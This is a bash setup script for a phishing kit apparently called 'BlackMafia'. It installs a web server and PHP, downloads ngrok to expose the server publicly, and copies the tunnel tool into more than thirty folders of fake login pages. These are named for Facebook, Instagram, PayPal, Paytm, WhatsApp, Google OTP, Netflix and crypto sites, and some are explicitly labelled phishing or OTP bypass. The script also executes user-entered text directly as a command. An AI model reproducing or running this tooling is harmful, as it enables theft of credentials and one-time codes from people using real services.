#!/bin/bash
echo ""
clear
echo ""
echo ""
echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!!  PLEASE ENTER NGROK !!! \e[0m'
sleep 2
clear
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
sudo apt-get install apache2 -y
apt install php -y
apt install tail -y
apt install curl -y
systemctl start apache2
apt install ruby -y
apt-get install ruby -y
apt install gem -y
gem install lolcat
apt install gnome-terminal -y
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
unzip ngrok-stable-linux-amd64.zip
cp -R ngrok BlackMafiaLovehacker Sites/github/
cp -R ngrok BlackMafiaLovehacker Sites/Hotstar-otp-bypass/
cp -R ngrok BlackMafiaLovehacker Sites/instagram/
cp -R ngrok BlackMafiaLovehacker Sites/Linkedin/
cp -R ngrok BlackMafiaLovehacker Sites/Netflix/
cp -R ngrok BlackMafiaLovehacker Sites/Paytm-Phishing/paytm/
cp -R ngrok BlackMafiaLovehacker Sites/Paytm-Phishing/signup/
cp -R ngrok BlackMafiaLovehacker Sites/spotify/
cp -R ngrok BlackMafiaLovehacker Sites/whatsapp-phishing/
cp -R ngrok BlackMafiaLovehacker Sites/facebook/
cp -R ngrok BlackMafiaLovehacker Sites/google-otp/
cp -R ngrok BlackMafiaLovehacker Sites/instafollow/
cp -R ngrok BlackMafiaLovehacker Sites/ipfinder/
cp -R ngrok BlackMafiaLovehacker Sites/ola-otpbypass/
cp -R ngrok BlackMafiaLovehacker Sites/UberEats-Phishing/
cp -R ngrok BlackMafiaLovehacker Sites/Zomato-Phishing/
cp -R ngrok BlackMafiaLovehacker Sites/amazonsign/
cp -R ngrok BlackMafiaLovehacker Sites/tiktok/
cp -R ngrok BlackMafiaLovehacker Sites/phonepay/
cp -R ngrok BlackMafiaLovehacker Sites/paypal/
cp -R ngrok BlackMafiaLovehacker Sites/telegram/
cp -R ngrok BlackMafiaLovehacker Sites/twitter/
cp -R ngrok BlackMafiaLovehacker Sites/flipcart/
cp -R ngrok BlackMafiaLovehacker Sites/wordpress/
cp -R ngrok BlackMafiaLovehacker Sites/snapchat/
cp -R ngrok BlackMafiaLovehacker Sites/protonmail/
cp -R ngrok BlackMafiaLovehacker Sites/stackoverflow/
cp -R ngrok BlackMafiaLovehacker Sites/ebay/
cp -R ngrok BlackMafiaLovehacker Sites/twitch/
cp -R ngrok BlackMafiaLovehacker Sites/ajio/
cp -R ngrok BlackMafiaLovehacker Sites/cryptocurrency/
cp -R ngrok BlackMafiaLovehacker Sites/mobikwik/
cp -R ngrok BlackMafiaLovehacker Sites/pinterest/
chmod 7777 BlackMafia.sh
clear
echo ""
echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
echo ""
read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
sleep2
clear
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
sleep 4
clear




